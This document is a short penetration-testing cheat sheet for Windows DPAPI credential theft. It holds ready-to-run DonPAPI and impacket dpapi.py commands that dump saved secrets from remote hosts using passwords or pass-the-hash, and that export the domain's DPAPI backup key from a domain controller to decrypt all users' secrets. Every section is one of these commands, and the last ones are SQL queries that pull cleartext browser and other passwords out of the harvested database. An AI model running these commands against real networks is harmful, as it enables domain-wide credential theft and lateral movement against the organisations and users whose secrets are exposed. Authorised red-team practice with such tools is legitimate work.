# DPAPI

% dpapi, windows, donpapi

## DonPAPI - Dump all - pwd
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi collect -u <user> -p '<password>' -d <domain> -t <target>
```

## DonPAPI - Dump all - hashes
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi collect -u <user> -d <domain> -H '<hashes>' -t <target>
```

## DonPAPI - Dump domain backup key
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi collect -u <user> -p '<password>' -d <domain> -t <target> --fetch-pvk
```

## Get Domain BackupKeys
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
dpapi.py backupkeys --export -t <domain>/<da_user>@<dc_ip> -hashes '<hashes>'
```

##  DonPAPI - Dump all with backup key

#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi collect --pvkfile domain_backupkey.pvk  -u <user> -p '<password>' -d <domain> -t <target> --hashes '<hashes>'
```

## DonPAPI - Start GUI

#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi gui
```

## DonPAPI DB - Browser pwd not empty

```
select username, password, target from credz where type like 'browser%' and password IS NOT '' and password is not ' ';
```

## DonPAPI DB - List type of credz

```
select distinct type from credz;
```


## DonPAPI DB - Select credz whith clean password 

```
select username, password,target from credz where password REGEXP '^[\x20-\x7EÀ-ÖØ-öø-ÿ]+$' and length(password) between 4 and 30;
```

